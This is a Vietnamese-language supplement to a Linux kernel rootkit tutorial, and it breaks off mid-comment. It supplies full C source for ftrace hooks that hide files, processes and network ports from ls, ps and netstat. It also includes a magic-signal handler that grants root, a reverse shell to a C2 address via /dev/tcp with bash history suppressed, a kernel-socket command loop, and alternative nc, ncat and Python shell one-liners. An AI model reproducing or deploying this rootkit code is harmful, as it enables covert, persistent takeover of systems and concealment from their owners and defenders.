# Linux Kernel Rootkit — Bổ sung Full Code cho mọi phần còn thiếu

> File này chứa toàn bộ code đầy đủ cho những phần bị thiếu / placeholder trong file chính.
> Mỗi section ghi rõ nó bổ sung cho Chapter nào.

---

## Mục lục

- [Fix Chapter 4: ft_hooked_getdents64 — full code thay vì "reuse"](#fix-chapter-4)
- [Fix Chapter 4: ft_hooked_kill — thêm module toggle + PID toggle](#fix-chapter-4-kill)
- [Fix Chapter 4: udp4_seq_show — full code thay vì "tương tự"](#fix-chapter-4-udp)
- [Fix Chapter 8: rk_spawn_reverse_shell — Kernel reverse shell](#fix-chapter-8-reverse-shell)
- [Fix Chapter 8: rk_execute_command — Kernel command execution](#fix-chapter-8-command-exec)
- [Fix Chapter 8: rk_self_destruct — Tự hủy rootkit](#fix-chapter-8-self-destruct)
- [Fix Chapter 8: rk_activate_backdoor — Bind shell sau knock](#fix-chapter-8-backdoor)
- [Fix Chapter 10: eBPF rootkit — Full compilable code](#fix-chapter-10-ebpf)
- [Chapter 12: Persistence — Full code 7 phương pháp](#chapter-12-persistence)
- [Chapter 13: Anti-Forensics & Self-Protection — Full code](#chapter-13-anti-forensics)
- [Chapter 14: Covert Communication & C2 — Full code](#chapter-14-covert-c2)

---

## Fix Chapter 4: ft_hooked_getdents64 — Full code {#fix-chapter-4}

Thay thế cho dòng `/* Reuse logic từ hooked_getdents64 ở Chapter 3 */` trong file chính.

```c
/* ftrace_hooks_complete.c — ft_hooked_getdents64 FULL IMPLEMENTATION
 *
 * Đây là phiên bản hoàn chỉnh, không "reuse" từ đâu cả.
 * Dùng ft_orig_getdents64 thay vì orig_getdents64.
 * Thêm: ẩn process, ẩn file, ẩn chính rootkit module từ /proc/modules.
 */

#include "rootkit.h"

static asmlinkage long (*ft_orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*ft_orig_getdents)(const struct pt_regs *);
static asmlinkage long (*ft_orig_kill)(const struct pt_regs *);
static int (*ft_orig_tcp4_seq_show)(struct seq_file *, void *);
static int (*ft_orig_udp4_seq_show)(struct seq_file *, void *);

/* ──────────────────────────────────────────────────────────────
 * Kiểm tra fd trỏ tới /proc
 *
 * Tại sao tách function: reuse cho cả getdents64 và getdents.
 * fdget/fdput pattern đảm bảo file struct không bị freed
 * trong khi ta đang đọc.
 *
 * Chi tiết:
 *   Mỗi open file trong process có fd → files_struct → file *.
 *   file->f_path.dentry->d_inode->i_sb->s_type->name = fs type.
 *   "proc" = procfs → đang đọc /proc directory.
 *
 *   Cần check vì:
 *   - getdents64 cho /proc → filter PIDs
 *   - getdents64 cho /home → filter filenames
 *   - Phải phân biệt để áp dụng đúng logic
 * ────────────────────────────────────────────────────────────── */
static bool ft_is_proc_fd(int fd)
{
    struct fd f;
    struct inode *inode;
    struct super_block *sb;
    bool result = false;

    f = fdget(fd);
    if (!f.file)
        return false;

    inode = file_inode(f.file);
    if (!inode)
        goto out;

    sb = inode->i_sb;
    if (!sb || !sb->s_type || !sb->s_type->name)
        goto out;

    result = (strcmp(sb->s_type->name, "proc") == 0);

out:
    fdput(f);
    return result;
}

/* ──────────────────────────────────────────────────────────────
 * ft_hooked_getdents64 — FULL IMPLEMENTATION
 *
 * Đây là hook function hoàn chỉnh cho ftrace-based hooking.
 *
 * Flow:
 *   1. Extract arguments từ pt_regs
 *   2. Gọi ft_orig_getdents64 (original handler)
 *   3. Copy userspace buffer vào kernel
 *   4. Iterate mỗi linux_dirent64 entry
 *   5. Quyết định hide hay show cho mỗi entry
 *   6. Nếu hide: xóa entry khỏi buffer
 *   7. Copy buffer modified trở lại userspace
 *   8. Return adjusted byte count
 *
 * Hide criteria:
 *   a) Filename bắt đầu bằng HIDDEN_PREFIX ("rk_")
 *   b) Entry là PID directory trong /proc và PID nằm trong hidden list
 *   c) Entry là tên module rootkit (cho /proc/modules backup hiding)
 * ────────────────────────────────────────────────────────────── */
static asmlinkage long ft_hooked_getdents64(const struct pt_regs *regs)
{
    /* ── Extract syscall arguments từ registers ──
     *
     * Trên x86-64 kernel >= 4.17, syscall handlers nhận pt_regs *:
     *   regs->di = arg1 = unsigned int fd
     *   regs->si = arg2 = struct linux_dirent64 __user *dirent
     *   regs->dx = arg3 = unsigned int count (buffer size)
     *
     * __user annotation: pointer trỏ vào userspace memory.
     * KHÔNG ĐƯỢC dereference trực tiếp — phải dùng copy_from_user.
     */
    int fd = (int)regs->di;
    struct linux_dirent64 __user *user_dirent =
        (struct linux_dirent64 __user *)regs->si;

    /* Gọi original syscall handler.
     *
     * ft_orig_getdents64 = address của __x64_sys_getdents64 gốc.
     * Được save khi install_ftrace_hook() chạy.
     *
     * Sau call này:
     *   - user_dirent buffer (userspace) đã được kernel fill
     *   - ret = tổng bytes data trong buffer
     *   - ret = 0 → end of directory (không còn entries)
     *   - ret < 0 → error (invalid fd, permission denied, etc.)
     */
    long ret = ft_orig_getdents64(regs);

    /* Locals */
    struct linux_dirent64 *kern_buf = NULL;
    struct linux_dirent64 *cur = NULL;
    struct linux_dirent64 *prev = NULL;
    unsigned long offset = 0;
    bool proc_dir = false;
    long adjusted_ret;

    /* Nothing to filter */
    if (ret <= 0)
        return ret;

    /* Preserve original return value cho adjustment tracking */
    adjusted_ret = ret;

    /* ── Allocate kernel buffer ──
     *
     * Tại sao cần copy vào kernel:
     *   1. Không thể iterate userspace memory trực tiếp từ kernel
     *      (SMAP: Supervisor Mode Access Prevention sẽ fault)
     *   2. copy_from_user/copy_to_user là kernel API bắt buộc
     *   3. Race condition: nếu process khác modify buffer concurrent
     *      → TOCTOU (Time-of-check-time-of-use) vulnerability
     *   4. Page fault trong kernel = oops nếu page đang swapped out
     *
     * GFP_KERNEL: allocation flag cho process context.
     *   - CÓ THỂ sleep (block nếu hết memory, đợi reclaim)
     *   - KHÔNG dùng trong interrupt/softirq context
     *   - Syscall hook chạy trong process context → GFP_KERNEL OK
     */
    kern_buf = kzalloc(ret, GFP_KERNEL);
    if (!kern_buf)
        return ret;

    /* ── Copy userspace data vào kernel ──
     *
     * copy_from_user(dst_kernel, src_user, size):
     *   Return: 0 = success
     *           N = number of bytes NOT copied (partial failure)
     *
     * Internally:
     *   1. Check user pointer validity (access_ok)
     *   2. Temporarily enable SMAP bypass (stac/clac instructions)
     *   3. Copy with page fault handling
     *   4. Re-enable SMAP
     *
     * Nếu fail (user buffer invalid, unmapped, etc.) → trả ret gốc.
     */
    if (copy_from_user(kern_buf, user_dirent, ret)) {
        kfree(kern_buf);
        return ret;
    }

    /* Check nếu đang đọc /proc (cho PID hiding logic) */
    proc_dir = ft_is_proc_fd(fd);

    /* ── Main filtering loop ──
     *
     * linux_dirent64 entries nằm liên tiếp trong buffer:
     *
     *   kern_buf ──→ ┌─────────────────────┐ offset = 0
     *                │ d_ino    (8 bytes)   │
     *                │ d_off    (8 bytes)   │
     *                │ d_reclen (2 bytes)   │ ← kích thước TOÀN BỘ entry
     *                │ d_type   (1 byte)    │
     *                │ d_name[] (variable)  │ ← null-terminated filename
     *                │ [padding]            │
     *                ├─────────────────────┤ offset += d_reclen
     *                │ next entry...        │
     *                ├─────────────────────┤
     *                │ next entry...        │
     *                └─────────────────────┘ offset == ret (end)
     *
     * d_reclen bao gồm header + name + padding → variable per entry.
     * Ta dùng d_reclen để nhảy từ entry này sang entry kế.
     */
    offset = 0;
    while (offset < adjusted_ret) {
        cur = (struct linux_dirent64 *)((char *)kern_buf + offset);

        /* Validate d_reclen — protect against corruption.
         * d_reclen == 0 → infinite loop. d_reclen > remaining → overread. */
        if (cur->d_reclen == 0 || cur->d_reclen > (adjusted_ret - offset))
            break;

        bool hide_this = false;

        /* ── Rule 1: Hide by filename prefix ──
         *
         * Bất kỳ file/directory nào có tên bắt đầu bằng HIDDEN_PREFIX
         * sẽ bị ẩn khỏi ls, find, readdir, và mọi tool dùng getdents.
         *
         * strncmp so sánh N bytes đầu tiên.
         * Nếu match → file invisible.
         *
         * Ví dụ: HIDDEN_PREFIX = "rk_"
         *   "rk_config"    → HIDDEN
         *   "rk_backdoor"  → HIDDEN
         *   "readme.txt"   → visible
         */
        if (strncmp(cur->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) == 0) {
            hide_this = true;
        }

        /* ── Rule 2: Hide PID directories trong /proc ──
         *
         * /proc chứa numbered directories cho mỗi process:
         *   /proc/1/     → init/systemd
         *   /proc/1234/  → process PID 1234
         *   /proc/self/  → symlink tới current process
         *
         * Khi ps/top đọc /proc, chúng getdents64 → thấy "1", "1234", etc.
         * → Rồi stat mỗi PID directory để lấy process info.
         *
         * Nếu ta remove PID entry khỏi getdents64 result:
         *   → ps/top KHÔNG thấy process → invisible.
         *   → Process VẪN chạy (scheduler không dùng /proc).
         *
         * Chỉ filter khi:
         *   a) fd trỏ tới /proc (proc_dir == true)
         *   b) d_name là numeric string (PID, không phải "cpuinfo")
         *   c) PID nằm trong hidden_pids list
         */
        if (proc_dir && !hide_this) {
            long pid_val;
            if (kstrtol(cur->d_name, 10, &pid_val) == 0) {
                if (is_pid_hidden((pid_t)pid_val))
                    hide_this = true;
            }
        }

        /* ── Rule 3: Hide rootkit module entry khi đọc /proc/modules
         *    (đã handled ở Rule 1 nếu module name có HIDDEN_PREFIX)
         *    Nếu module name không có prefix, thêm explicit check ở đây */

        /* ── Perform hiding ── */
        if (hide_this) {
            if (cur == kern_buf) {
                /* Entry đầu tiên: shift mọi thứ phía sau lên.
                 *
                 * Trước:
                 *   [HIDDEN entry][entry B][entry C]
                 *    ^offset=0    ^reclen   ...
                 *
                 * Sau memmove:
                 *   [entry B][entry C]
                 *   adjusted_ret giảm đi d_reclen của HIDDEN
                 *
                 * memmove (không phải memcpy) vì source và dest overlap.
                 */
                adjusted_ret -= cur->d_reclen;
                if (adjusted_ret > 0) {
                    memmove(cur,
                            (char *)cur + cur->d_reclen,
                            adjusted_ret);
                }
                /* Không tăng offset — vị trí hiện tại giờ chứa
                 * entry kế (đã shift), cần kiểm tra lại. */
                continue;
            }

            /* Entry ở giữa hoặc cuối: "nuốt" vào entry trước.
             *
             * Nguyên lý: mỗi entry tự khai báo kích thước (d_reclen).
             * Userspace dùng d_reclen để tính offset entry kế:
             *   next_entry = (char *)current + current->d_reclen
             *
             * Nếu ta tăng d_reclen của entry trước:
             *   prev->d_reclen += cur->d_reclen
             *
             * → Userspace nhảy TỪ prev THẲNG tới entry SAU cur.
             * → cur bị skip (vẫn nằm trong memory nhưng unreachable).
             *
             * Trước:
             *   [prev, reclen=32] [HIDDEN, reclen=48] [next entry]
             *
             * Sau:
             *   [prev, reclen=80]                     [next entry]
             *   (prev "nuốt" 48 bytes của HIDDEN)
             */
            if (prev)
                prev->d_reclen += cur->d_reclen;
        } else {
            /* Entry visible — track làm prev cho potential future hide */
            prev = cur;
        }

        offset += cur->d_reclen;
    }

    /* ── Copy filtered buffer trở lại userspace ──
     *
     * copy_to_user(dst_user, src_kernel, size):
     *   Ghi adjusted_ret bytes (có thể < ret gốc) vào user buffer.
     *
     * Userspace sẽ thấy:
     *   - Ít entries hơn (hidden entries đã bị remove)
     *   - Return value nhỏ hơn (adjusted_ret < ret)
     *   - Hoàn toàn transparent — ls, find, etc. hoạt động bình thường
     *     nhưng không list hidden entries.
     */
    if (adjusted_ret > 0)
        copy_to_user(user_dirent, kern_buf, adjusted_ret);

    kfree(kern_buf);
    return adjusted_ret;
}

/* ──────────────────────────────────────────────────────────────
 * ft_hooked_getdents — Hook cho legacy getdents (32-bit compat)
 *
 * Một số tools cũ hoặc 32-bit binaries dùng getdents thay vì
 * getdents64. Phải hook CẢ HAI để không bị bypass.
 *
 * struct linux_dirent (32-bit version):
 *   unsigned long  d_ino;
 *   unsigned long  d_off;
 *   unsigned short d_reclen;
 *   char           d_name[];
 *   // d_type nằm SAU d_name (khác 64-bit version)
 *
 * Logic giống getdents64 nhưng dùng struct khác.
 * ────────────────────────────────────────────────────────────── */

struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

static asmlinkage long ft_hooked_getdents(const struct pt_regs *regs)
{
    int fd = (int)regs->di;
    struct linux_dirent __user *user_dirent =
        (struct linux_dirent __user *)regs->si;
    long ret = ft_orig_getdents(regs);
    struct linux_dirent *kern_buf, *cur, *prev = NULL;
    unsigned long offset = 0;
    long adjusted_ret;
    bool proc_dir;

    if (ret <= 0) return ret;

    adjusted_ret = ret;
    kern_buf = kzalloc(ret, GFP_KERNEL);
    if (!kern_buf) return ret;
    if (copy_from_user(kern_buf, user_dirent, ret)) {
        kfree(kern_buf);
        return ret;
    }

    proc_dir = ft_is_proc_fd(fd);

    while (offset < adjusted_ret) {
        cur = (void *)kern_buf + offset;
        if (cur->d_reclen == 0 || cur->d_reclen > (adjusted_ret - offset))
            break;

        bool hide_this = false;

        if (strncmp(cur->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) == 0)
            hide_this = true;

        if (proc_dir && !hide_this) {
            long pid_val;
            if (kstrtol(cur->d_name, 10, &pid_val) == 0)
                if (is_pid_hidden((pid_t)pid_val))
                    hide_this = true;
        }

        if (hide_this) {
            if (cur == kern_buf) {
                adjusted_ret -= cur->d_reclen;
                if (adjusted_ret > 0)
                    memmove(cur, (char *)cur + cur->d_reclen,
                            adjusted_ret);
                continue;
            }
            if (prev) prev->d_reclen += cur->d_reclen;
        } else {
            prev = cur;
        }
        offset += cur->d_reclen;
    }

    if (adjusted_ret > 0)
        copy_to_user(user_dirent, kern_buf, adjusted_ret);
    kfree(kern_buf);
    return adjusted_ret;
}
```

---

## Fix Chapter 4: ft_hooked_kill — Thêm module toggle + PID toggle {#fix-chapter-4-kill}

File chính Chapter 4 `ft_hooked_kill` chỉ có give-root (line 1968-1989).
So với `hooked_kill` Chapter 3 có đủ 3 commands. Đây là phiên bản hoàn chỉnh.

```c
/* ft_hooked_kill — FULL VERSION (thay thế cho bản thiếu trong file chính)
 *
 * 3 commands qua magic signal:
 *   kill -54 31337  → give root cho calling process
 *   kill -54 31338  → toggle ẩn/hiện module
 *   kill -54 <PID>  → toggle ẩn/hiện process <PID>
 */

static asmlinkage long ft_hooked_kill(const struct pt_regs *regs)
{
    pid_t target_pid = (pid_t)regs->di;
    int sig = (int)regs->si;

    /* Chỉ intercept magic signal */
    if (sig != MAGIC_SIGNAL)
        return ft_orig_kill(regs);

    /* ──── Command 1: Give Root ────
     *
     * kill(31337, 54) → calling process trở thành root.
     *
     * prepare_creds() tạo bản copy mutable của current credentials.
     * Set tất cả UIDs/GIDs = 0 + full capabilities.
     * commit_creds() atomic swap.
     */
    if (target_pid == MAGIC_PID) {
        struct cred *new_cred = prepare_creds();
        if (new_cred) {
            /* Set all identity fields to root */
            new_cred->uid.val  = new_cred->gid.val  = 0;
            new_cred->euid.val = new_cred->egid.val = 0;
            new_cred->suid.val = new_cred->sgid.val = 0;
            new_cred->fsuid.val = new_cred->fsgid.val = 0;

            /* Full capabilities — unrestricted root */
            new_cred->cap_effective   = CAP_FULL_SET;
            new_cred->cap_permitted   = CAP_FULL_SET;
            new_cred->cap_inheritable = CAP_FULL_SET;
            new_cred->cap_bset        = CAP_FULL_SET;
            new_cred->cap_ambient     = CAP_FULL_SET;

            commit_creds(new_cred);
        }
        return 0;
    }

    /* ──── Command 2: Toggle Module Visibility ────
     *
     * kill(31338, 54) → ẩn/hiện rootkit module.
     *
     * Khi ẩn: module biến mất khỏi lsmod, /proc/modules, /sys/module/
     * Khi hiện: module xuất hiện trở lại (cần cho rmmod cleanup).
     *
     * module_hidden: global bool track trạng thái hiện tại.
     * rk_hide_module() / rk_show_module() = DKOM functions từ Chapter 6.
     */
    if (target_pid == HIDE_MODULE_PID) {
        if (module_hidden) {
            rk_show_module();
            module_hidden = false;
            pr_info("rk: module visible\n");
        } else {
            rk_hide_module();
            module_hidden = true;
            pr_info("rk: module hidden\n");
        }
        return 0;
    }

    /* ──── Command 3: Toggle Process Hiding ────
     *
     * kill(<PID>, 54) → ẩn/hiện process có PID đó.
     *
     * Nếu PID đang hidden → show lại.
     * Nếu PID đang visible → hide.
     *
     * is_pid_hidden() / add_hidden_pid() / remove_hidden_pid()
     * là helper functions quản lý hidden PID list (Chapter 3).
     *
     * Khi PID trong hidden list:
     *   - getdents64 hook filter /proc/<PID> directory entry
     *   - ps, top, htop không thấy process
     *   - Process VẪN chạy bình thường (scheduler không dùng /proc)
     */
    if (is_pid_hidden(target_pid)) {
        remove_hidden_pid(target_pid);
        pr_info("rk: PID %d visible\n", target_pid);
    } else {
        add_hidden_pid(target_pid);
        pr_info("rk: PID %d hidden\n", target_pid);
    }

    return 0;
}
```

---

## Fix Chapter 4: udp4_seq_show — Full code {#fix-chapter-4-udp}

```c
/* udp_hide.c — Ẩn UDP connections từ /proc/net/udp
 *
 * /proc/net/udp output tương tự /proc/net/tcp:
 *   Mỗi dòng = 1 UDP socket đang listen hoặc active.
 *   Tools: ss -u, netstat -u đọc từ đây.
 *
 * Hook udp4_seq_show() giống tcp4_seq_show():
 *   Nếu port match → return 0 (suppress output).
 *
 * Tại sao cần hook UDP riêng:
 *   - TCP và UDP dùng KHÁC seq_operations struct
 *   - tcp4_seq_show ≠ udp4_seq_show
 *   - DNS (53), SNMP (161), syslog (514) dùng UDP
 *   - C2 qua DNS tunneling = UDP traffic cần ẩn
 */

static int (*ft_orig_udp4_seq_show)(struct seq_file *, void *);

static int ft_hooked_udp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk;

    /* SEQ_START_TOKEN = header line. Luôn cho qua.
     *
     * Header:
     *   "  sl  local_address rem_address   st tx_queue ..."
     * Ẩn header = tools parse fail → suspicious. */
    if (v == SEQ_START_TOKEN)
        return ft_orig_udp4_seq_show(seq, v);

    sk = (struct sock *)v;

    /* Check source port (local) và destination port.
     *
     * UDP socket structure:
     *   sk->sk_num   = local port mà socket bind()
     *   sk->sk_dport = remote port (nếu connected UDP)
     *
     * UDP thường stateless nên sk_dport có thể = 0
     * cho unconnected sockets (listen-only).
     *
     * Check sk_num đủ để ẩn listening UDP sockets. */
    if (sk->sk_num == HIDDEN_PORT ||
        ntohs(sk->sk_dport) == HIDDEN_PORT) {
        return 0;  /* Suppress: dòng này không xuất hiện */
    }

    return ft_orig_udp4_seq_show(seq, v);
}

/* ──────────────────────────────────────────────────────────────
 * Ẩn UDP6 connections (/proc/net/udp6) — IPv6
 *
 * Nếu server dùng IPv6, cần hook udp6_seq_show() nữa.
 * Logic hoàn toàn giống, chỉ khác tên function.
 * ────────────────────────────────────────────────────────────── */
static int (*ft_orig_udp6_seq_show)(struct seq_file *, void *);

static int ft_hooked_udp6_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk;

    if (v == SEQ_START_TOKEN)
        return ft_orig_udp6_seq_show(seq, v);

    sk = (struct sock *)v;

    if (sk->sk_num == HIDDEN_PORT ||
        ntohs(sk->sk_dport) == HIDDEN_PORT)
        return 0;

    return ft_orig_udp6_seq_show(seq, v);
}

/* TCP6 tương tự */
static int (*ft_orig_tcp6_seq_show)(struct seq_file *, void *);

static int ft_hooked_tcp6_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk;
    if (v == SEQ_START_TOKEN)
        return ft_orig_tcp6_seq_show(seq, v);
    sk = (struct sock *)v;
    if (sk->sk_num == HIDDEN_PORT ||
        ntohs(sk->sk_dport) == HIDDEN_PORT)
        return 0;
    return ft_orig_tcp6_seq_show(seq, v);
}

/* Thêm vào ftrace hook table:
 *
 * static struct ftrace_hook ft_hooks[] = {
 *     ...existing hooks...,
 *     HOOK("udp4_seq_show",  ft_hooked_udp4_seq_show,  &ft_orig_udp4_seq_show),
 *     HOOK("udp6_seq_show",  ft_hooked_udp6_seq_show,  &ft_orig_udp6_seq_show),
 *     HOOK("tcp6_seq_show",  ft_hooked_tcp6_seq_show,  &ft_orig_tcp6_seq_show),
 * };
 */
```

---

## Fix Chapter 8: rk_spawn_reverse_shell {#fix-chapter-8-reverse-shell}

```c
/* reverse_shell.c — Kernel-level reverse shell
 *
 * Khi magic packet hoặc port knock trigger, rootkit mở
 * reverse shell connection TỪ kernel space.
 *
 * 2 approaches:
 *   A) call_usermodehelper: spawn userspace process từ kernel
 *      → Đơn giản, dùng /bin/bash. Nhưng process visible trừ khi hidden.
 *   B) Kernel socket: tạo TCP connection trong kernel, pipe I/O
 *      → Không có process mới. Nhưng phức tạp hơn nhiều.
 *
 * APT approach: thường dùng (A) + hide spawned process.
 * Drovorub, Reptile đều dùng call_usermodehelper pattern.
 */

#include "rootkit.h"
#include <linux/kmod.h>       /* call_usermodehelper */
#include <linux/kthread.h>    /* kthread_create, kthread_run */
#include <net/sock.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>

/* ══════════════════════════════════════════════════════════════
 * METHOD A: call_usermodehelper — Spawn bash reverse shell
 *
 * call_usermodehelper() là kernel API cho phép kernel code
 * chạy một userspace program. Kernel dùng API này internally
 * cho hotplug events, modprobe, etc.
 *
 * Cách hoạt động:
 *   1. Kernel fork một kernel thread
 *   2. Kernel thread exec userspace binary
 *   3. Binary chạy với full root privileges
 *   4. Kết quả trả về qua wait flags
 *
 * Tại sao không dùng execve trực tiếp:
 *   - execve replace current process image
 *   - Trong kernel context, "current" là kernel thread/interrupted task
 *   - Gọi execve trực tiếp từ kernel = corrupt kernel state
 *   - call_usermodehelper handle fork+exec properly
 *
 * Security consideration:
 *   Process được spawn sẽ visible trong ps nếu không hidden.
 *   Rootkit nên tự add PID vào hidden list ngay sau spawn.
 *   Hoặc: ẩn qua process name matching.
 * ══════════════════════════════════════════════════════════════ */

static void rk_spawn_reverse_shell(const char *c2_addr)
{
    /* Parse c2_addr format: "IP:PORT"
     * Ví dụ: "10.10.10.1:4444" */
    char ip[64], port[16];
    char *colon;
    char bash_cmd[512];

    /* Copy vì strsep modifies string */
    strncpy(ip, c2_addr, sizeof(ip) - 1);
    ip[sizeof(ip) - 1] = '\0';

    colon = strchr(ip, ':');
    if (!colon) {
        pr_err("rk: invalid c2 addr format: %s\n", c2_addr);
        return;
    }
    *colon = '\0';
    strncpy(port, colon + 1, sizeof(port) - 1);
    port[sizeof(port) - 1] = '\0';

    /* Build reverse shell command.
     *
     * /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
     *
     * Phân tích:
     *   bash -i              : interactive bash shell
     *   >& /dev/tcp/IP/PORT  : redirect stdout+stderr tới TCP connection
     *   0>&1                 : redirect stdin từ cùng connection
     *
     * Kết quả: attacker nhận interactive bash shell qua TCP.
     *
     * Alternative commands (nếu bash -i bị block):
     *   - /bin/sh + nc:  sh -i 2>&1 | nc IP PORT
     *   - Python:        python3 -c 'import socket,os,pty...'
     *   - Perl:          perl -e 'use Socket;...'
     *   - ncat --exec:   ncat IP PORT -e /bin/bash
     */
    snprintf(bash_cmd, sizeof(bash_cmd),
             "bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1 &'",
             ip, port);

    /* call_usermodehelper args:
     *   argv[0] = path to executable
     *   argv[1..] = arguments
     *   envp[] = environment variables
     *
     * UMH_WAIT_EXEC: đợi exec hoàn thành (không đợi process exit)
     * UMH_WAIT_PROC: đợi process exit (blocking)
     * UMH_NO_WAIT:   fire-and-forget (async)
     *
     * Dùng UMH_NO_WAIT vì shell chạy indefinitely.
     * Nếu dùng UMH_WAIT_PROC → kernel thread block mãi mãi. */
    {
        char *argv[] = {
            "/bin/bash",
            "-c",
            bash_cmd,
            NULL
        };
        char *envp[] = {
            "HOME=/tmp",
            "TERM=xterm",
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            "HISTFILE=/dev/null",   /* Không lưu bash history */
            NULL
        };

        int ret = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
        if (ret != 0)
            pr_err("rk: reverse shell spawn failed: %d\n", ret);
        else
            pr_info("rk: reverse shell spawned to %s:%s\n", ip, port);
    }
}

/* ══════════════════════════════════════════════════════════════
 * METHOD B: Kernel socket reverse shell (advanced)
 *
 * Tạo TCP connection TRỰC TIẾP trong kernel space.
 * Không spawn userspace process → không visible trong ps.
 *
 * Chạy trong kernel thread để không block current task.
 *
 * Giới hạn:
 *   - Kernel không có /bin/bash → command execution phức tạp
 *   - I/O phải hand-roll (recv command → execute → send output)
 *   - Dùng call_usermodehelper cho mỗi command
 *   - Hoặc implement simple command parser trong kernel
 * ══════════════════════════════════════════════════════════════ */

struct shell_config {
    __be32 c2_ip;
    __be16 c2_port;
};

static struct task_struct *shell_thread = NULL;

/* ── Receive data từ kernel socket ──
 *
 * kernel_recvmsg() tương tự recvmsg() syscall nhưng kernel-internal.
 * Dùng msghdr + kvec (kernel vector) thay vì iovec.
 */
static int ksock_recv(struct socket *sock, char *buf, int len)
{
    struct msghdr msg = { 0 };
    struct kvec iov = {
        .iov_base = buf,
        .iov_len  = len,
    };

    return kernel_recvmsg(sock, &msg, &iov, 1, len, MSG_DONTWAIT);
}

/* ── Send data qua kernel socket ── */
static int ksock_send(struct socket *sock, const char *buf, int len)
{
    struct msghdr msg = { 0 };
    struct kvec iov = {
        .iov_base = (void *)buf,
        .iov_len  = len,
    };

    return kernel_sendmsg(sock, &msg, &iov, 1, len);
}

/* ── Execute command và capture output ──
 *
 * Dùng call_usermodehelper_exec() with pipes.
 * Hoặc simple approach: write output vào temp file, read back.
 *
 * Approach đây: execute command, redirect output vào /tmp file,
 * đọc file từ kernel, gửi qua socket, xóa file.
 */
static int rk_exec_and_send(struct socket *sock, const char *cmd)
{
    char *output_path = "/tmp/.rk_cmd_out";
    char full_cmd[1024];
    struct file *f;
    char *read_buf;
    loff_t pos = 0;
    ssize_t bytes;

    /* Execute command, redirect output tới temp file */
    snprintf(full_cmd, sizeof(full_cmd),
             "/bin/sh -c '%s > %s 2>&1'", cmd, output_path);

    {
        char *argv[] = { "/bin/sh", "-c", full_cmd, NULL };
        char *envp[] = {
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            NULL
        };
        /* UMH_WAIT_PROC: đợi command hoàn thành để đọc output */
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    }

    /* Đọc output file */
    f = filp_open(output_path, O_RDONLY, 0);
    if (IS_ERR(f)) {
        ksock_send(sock, "exec failed\n", 12);
        return -1;
    }

    read_buf = kzalloc(4096, GFP_KERNEL);
    if (!read_buf) {
        filp_close(f, NULL);
        return -1;
    }

    while ((bytes = kernel_read(f, read_buf, 4096, &pos)) > 0) {
        ksock_send(sock, read_buf, bytes);
    }

    kfree(read_buf);
    filp_close(f, NULL);

    /* Xóa temp file.
     * Dùng vfs_unlink hoặc call_usermodehelper("rm"). */
    {
        char *argv[] = { "/bin/rm", "-f", output_path, NULL };
        char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    }

    return 0;
}

/* ── Kernel thread: reverse shell loop ──
 *
 * Thread chạy indefinitely:
 *   1. Connect tới C2
 *   2. Recv command
 *   3. Execute
 *   4. Send output
 *   5. Loop
 */
static int reverse_shell_thread_fn(void *data)
{
    struct shell_config *cfg = (struct shell_config *)data;
    struct socket *sock = NULL;
    struct sockaddr_in addr;
    char cmd_buf[1024];
    int ret, cmd_len;

    /* ── Create TCP socket ── */
    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
                            IPPROTO_TCP, &sock);
    if (ret < 0) {
        pr_err("rk: sock_create failed: %d\n", ret);
        goto out;
    }

    /* ── Connect tới C2 server ── */
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = cfg->c2_ip;
    addr.sin_port = cfg->c2_port;

    ret = kernel_connect(sock, (struct sockaddr *)&addr,
                          sizeof(addr), 0);
    if (ret < 0) {
        pr_err("rk: kernel_connect failed: %d\n", ret);
        goto out_release;
    }

    /* Send banner */
    ksock_send(sock, "# rk shell ready\n# ", 19);

    /* ── Command loop ── */
    while (!kthread_should_stop()) {
        /* Recv command */
        memset(cmd_buf, 0, sizeof(cmd_buf));
        cmd_len = ksock_recv(sock, cmd_buf, sizeof(cmd_buf) - 1);

        if (cmd_len <= 0) {
            /* Connection closed hoặc error */
            if (cmd_len == -EAGAIN || cmd_len == -EWOULDBLOCK) {
                /* No data available (non-blocking) — sleep và retry */
                msleep(100);
                continue;
            }
            break;  /* Connection lost */
        }

        /* Trim trailing newline */
        while (cmd_len > 0 &&
               (cmd_buf[cmd_len - 1] == '\n' ||
                cmd_buf[cmd_len - 1] == '\r'))
            cmd_buf[--cmd_len] = '\0';

        if (cmd_len == 0) {
            ksock_send(sock, "# ", 2);
            continue;
        }

        /* Special commands */
        if (strcmp(cmd_buf, "exit") == 0 ||
            strcmp(cmd_buf, "quit") == 0)
            break;

        if (strcmp(cmd_buf, "root") == 0) {
            /* Give root tới current hoặc specified process */
            ksock_send(sock, "use: kill -54 31337\n# ", 21);
            continue;
        }

        /* Execute và send output */
        rk_exec_and_send(sock, cmd_buf);
        ksock_send(sock, "# ", 2);
    }

out_release:
    if (sock)
        sock_release(sock);
out:
    kfree(cfg);
    shell_thread = NULL;
    return 0;
}

/* ── Public API: spawn reverse shell thread ── */
static void rk_spawn_kernel_reverse_shell(__be32 c2_ip, __be16 c2_port)
{
    struct shell_config *cfg;

    if (shell_thread) {
        pr_info("rk: shell thread already running\n");
        return;
    }

    cfg = kzalloc(sizeof(*cfg), GFP_KERNEL);
    if (!cfg) return;
    cfg->c2_ip = c2_ip;
    cfg->c2_port = c2_port;

    /* kthread_run = kthread_create + wake_up_process.
     *
     * Thread name "kworker/u:0" — disguised as worker thread.
